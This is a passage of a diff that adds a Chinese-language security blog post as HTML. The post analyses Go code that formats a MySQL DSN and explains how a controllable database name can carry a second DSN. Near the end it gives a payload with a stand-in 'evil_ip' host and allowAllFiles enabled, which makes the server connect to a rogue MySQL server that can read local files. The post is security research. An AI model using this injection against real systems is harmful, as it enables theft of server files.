+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">db</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">gorm</span>.<span style="color:#a6e22e">Open</span>(<span style="color:#a6e22e">drive</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">drive</span>.<span style="color:#a6e22e">Config</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DSN</span>:                       <span style="color:#a6e22e">d</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DefaultStringSize</span>:         <span style="color:#ae81ff">256</span>,   <span style="color:#75715e">// string 类型字段的默认长度
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">SkipInitializeWithVersion</span>: <span style="color:#66d9ef">false</span>, <span style="color:#75715e">// 根据当前 MySQL 版本自动配置
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}), <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">gorm</span>.<span style="color:#a6e22e">Config</span>{})
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>, <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>InitDSN会将dsn序列化。
+InitDSN：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">InitDSN</span>(<span style="color:#a6e22e">dsn</span> <span style="color:#a6e22e">DSN</span>) (<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">isTLS</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">CA</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">Cert</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">Key</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">isTLS</span> = <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">certPool</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">x509</span>.<span style="color:#a6e22e">NewCertPool</span>()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">certPool</span>.<span style="color:#a6e22e">AppendCertsFromPEM</span>([]byte(<span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">CA</span>)); !<span style="color:#a6e22e">ok</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;failed to append ca certs&#34;</span>)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">clientCert</span> <span style="color:#f92672">:=</span> make([]<span style="color:#a6e22e">tls</span>.<span style="color:#a6e22e">Certificate</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">certs</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">tls</span>.<span style="color:#a6e22e">X509KeyPair</span>([]byte(<span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">Cert</span>), []byte(<span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">Key</span>))
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">clientCert</span> = append(<span style="color:#a6e22e">clientCert</span>, <span style="color:#a6e22e">certs</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_</span> = <span style="color:#a6e22e">mmsql</span>.<span style="color:#a6e22e">RegisterTLSConfig</span>(<span style="color:#e6db74">&#34;custom&#34;</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">tls</span>.<span style="color:#a6e22e">Config</span>{
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">RootCAs</span>:            <span style="color:#a6e22e">certPool</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Certificates</span>:       <span style="color:#a6e22e">clientCert</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">InsecureSkipVerify</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>		})
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cfg</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">mmsql</span>.<span style="color:#a6e22e">Config</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">User</span>:                 <span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">Username</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Passwd</span>:               <span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">Password</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Addr</span>:                 <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%s:%d&#34;</span>, <span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">Host</span>, <span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">Port</span>), <span style="color:#75715e">//IP:PORT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">Net</span>:                  <span style="color:#e6db74">&#34;tcp&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DBName</span>:               <span style="color:#a6e22e">dsn</span>.<span style="color:#a6e22e">DBName</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Loc</span>:                  <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Local</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">AllowNativePasswords</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ParseTime</span>:            <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">isTLS</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">TLSConfig</span> = <span style="color:#e6db74">&#34;custom&#34;</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">FormatDSN</span>(), <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>cfg中依然只有DBName可控。           <br>
+cfg.FormatDSN()：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">cfg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Config</span>) <span style="color:#a6e22e">FormatDSN</span>() <span style="color:#66d9ef">string</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf</span> <span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">Buffer</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// [username[:password]@]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">User</span>) &gt; <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">User</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">Passwd</span>) &gt; <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteByte</span>(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">Passwd</span>)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteByte</span>(<span style="color:#e6db74">&#39;@&#39;</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// [protocol[(address)]]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">Net</span>) &gt; <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">Net</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">Addr</span>) &gt; <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteByte</span>(<span style="color:#e6db74">&#39;(&#39;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">Addr</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteByte</span>(<span style="color:#e6db74">&#39;)&#39;</span>)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// /dbname
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteByte</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">DBName</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// [?param1=value1&amp;...&amp;paramN=valueN]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">hasParam</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">AllowAllFiles</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">hasParam</span> = <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#e6db74">&#34;?allowAllFiles=true&#34;</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>生成DSN：user:pass@tcp(address:port)/dbname?param=asd，其中dbname可控。             <br>
+解析DSN时从后往前找斜杠：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">ParseDSN</span>(<span style="color:#a6e22e">dsn</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">cfg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Config</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// New config with some default values
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cfg</span> = <span style="color:#a6e22e">NewConfig</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// [user[:password]@][net[(addr)]]/dbname[?param1=value1&amp;paramN=valueN]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// Find the last &#39;/&#39; (since the password or the net addr might contain a &#39;/&#39;)
+</span></span></span></code></pre></div><p>所以设置dbname为user:pass@tcp(evil_ip:port)/test?allowAllFiles=true&amp;可以使服务器连接恶意mysql服务器，前面的原始的address就被忽略了，开启allowAllFiles可以读取文件。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="http://localhost:1313/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
